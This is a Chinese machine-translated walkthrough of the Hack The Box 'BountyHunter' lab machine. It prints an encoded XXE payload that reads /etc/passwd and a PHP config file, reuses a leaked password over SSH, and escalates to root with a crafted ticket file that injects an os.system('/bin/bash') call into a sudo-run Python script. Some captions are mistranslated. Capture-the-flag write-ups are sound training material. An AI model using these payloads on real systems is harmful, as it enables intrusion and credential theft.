<html>
<head>
<title>Hack The Box — BountyHunter Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">破解盒子——赏金猎人演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hack-the-box-bountyhunter-walkthrough-fb771d4f8c0?source=collection_archive---------3-----------------------#2021-11-13">https://infosecwriteups.com/hack-the-box-bountyhunter-walkthrough-fb771d4f8c0?source=collection_archive---------3-----------------------#2021-11-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="363b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好，希望你们都好。我们将在《黑盒子》中看到赏金猎人机器的演练。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/c4a21bdf376b71d12ef18ad32a5be6e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7Hd6N--vBLG6JZXMXJoJ3g.jpeg"/></div></div></figure><p id="bbe5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们从Nmap扫描开始。</p><p id="f8b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe kx ky kz la b"><em class="lb">nmap -sC -sV 10.10.11.100</em></code></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lc"><img src="../Images/df85e606204c817b447783e8a40cd527.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mXvgDnpODk7ms7wVRNpMpw.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">Nmap扫描</figcaption></figure><p id="77a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，只有一个web应用在运行。该网络应用程序有一个门户，其中包含CVE记录的一些详细信息。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lh"><img src="../Images/572946673cadec5185ef43f2c924a422.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Yypc9iwQZ1f2iHB2kg6vKg.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">网络门户</figcaption></figure><p id="4600" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，现在我们将寻找XXE的弱点。因为在查看burp请求时，数据是以XML格式发送的。现在，我们将在cyberchef中使用URL编码和Base64对有效负载进行编码，有效负载的结果是</p><p id="bee5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe kx ky kz la b"><em class="lb">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGZvbyBbIDwhRU5USVRZIHh4ZSBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9L2V0Yy9wYXNzd2QiPl0gPiAKCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4meHhlOzwvdGl0bGU%2BCgkJPGN3ZT50ZXN0PC9jd2U%2BCgkJPGN2c3M%2BdGVzdDwvY3Zzcz4KCQk8cmV3YXJkPnRlc3Q8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D</em></code></p><p id="f84c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在插入这个。我们在base64中得到结果，解密时显示如下的<code class="fe kx ky kz la b"><em class="lb">etc/passwd</em></code>文件，</p><div class="km kn ko kp gt ab cb"><figure class="li kq lj lk ll lm ln paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><img src="../Images/ce163df764724dc3529aad86da24972c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*fVJK6-JNpxBx8fBZjvMHpQ.png"/></div></figure><figure class="li kq lj lk ll lm ln paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><img src="../Images/78d5402d091970da10a674c3f60439c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*rUvzCh5PMO05QZH_SoagmA.png"/></div><figcaption class="ld le gj gh gi lf lg bd b be z dk lo di lp lq translated"><code class="fe kx ky kz la b">source: base64decode.org</code></figcaption></figure></div><p id="79a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们将尝试使用cyberchef生成的有效负载获取db文件的内容。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lr"><img src="../Images/e7957c5bad7dcc7c086c4acf5b3eb632.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LUqSDB_PuNmHnYrVydwGKw.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">资料来源:网络论坛</figcaption></figure><p id="c9ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后，插入这个有效载荷，我们将获得db.php文件的内容。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ls"><img src="../Images/8e7b02d3f7df751f3d82b1264ec02cbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uS0byWdNyd4hFQi97ohyfg.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated"><code class="fe kx ky kz la b">source: base64decode.org</code></figcaption></figure><p id="0a69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我们可以得到密码。现在，我们将尝试使用管理员用户的SSH登录，但是失败了，然后我们看到有一个名为development的用户。现在，我们将尝试登录开发</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lc"><img src="../Images/a2837d02608b6884dc3c3c7298e09c45.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2qFx7u3rHnRz0Eo5jF2tKQ.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">SSH登录</figcaption></figure><p id="619f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，我们现在获得了用户标志，现在我们将尝试获得根标志。</p><p id="8470" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过尝试<code class="fe kx ky kz la b"><em class="lb">sudo -l</em></code>，我们得到以下错误，</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lc"><img src="../Images/03750f93e08c95905e8739a7fb26e815.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_y6z159L1vwK5DVUs2ZNoA.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">须岛一号</figcaption></figure><p id="2c24" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，<code class="fe kx ky kz la b"><em class="lb">/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</em></code>拥有root权限。因此，我们现在正在进行权限升级。通过阅读代码，我们知道每一次失败的尝试都会生成一张票。我们将尝试使用以下名为root.md的文件来获取root</p><p id="7f74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">root.md文件看起来像这样，</p><pre class="km kn ko kp gt lt la lu lv aw lw bi"><span id="e703" class="lx ly iq la b gy lz ma l mb mc"># Skytrain Inc<br/>## Ticket to root<br/>__Ticket Code:__<br/>**102 + 10 == 112 and __import__(‘os’).system(‘/bin/bash’) == False</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lc"><img src="../Images/7622b47de8c56f2973403714bfca58ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NrR1YZOo05zd3E8Lmrx5MA.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">文件:root.md</figcaption></figure><p id="8e0a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，尝试运行<code class="fe kx ky kz la b"><em class="lb">ticketvalidator.py</em></code>中的root.md文件。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lc"><img src="../Images/9c7310086a32c0e783f919ca1b520493.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*02-bNPuPpx9IkgXnPrt22Q.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">根</figcaption></figure><p id="55c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们获得了根访问权限，我们将转到根目录以获取根标志。</p><p id="da79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">跟我来:</p><blockquote class="md me mf"><p id="8937" class="jn jo lb jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated"><strong class="jp ir">insta gram</strong>:<a class="ae mj" href="https://www.instagram.com/sudhakar_._m/" rel="noopener ugc nofollow" target="_blank">https://www.instagram.com/sudhakar_._m/</a></p><p id="cc37" class="jn jo lb jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated"><strong class="jp ir">https://www.facebook.com/sudhakarmuthumani00</strong>:<a class="ae mj" href="https://www.facebook.com/sudhakarmuthumani00" rel="noopener ugc nofollow" target="_blank">脸书</a></p><p id="b3bb" class="jn jo lb jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated"><strong class="jp ir">推特</strong>:【https://twitter.com/Sudhakarmuthu04】T2</p><p id="59e6" class="jn jo lb jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">领英:<a class="ae mj" href="https://www.linkedin.com/in/sudhakarmuthumani/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/sudhakarmuthumani/</a></p></blockquote></div></div>    
</body>
</html>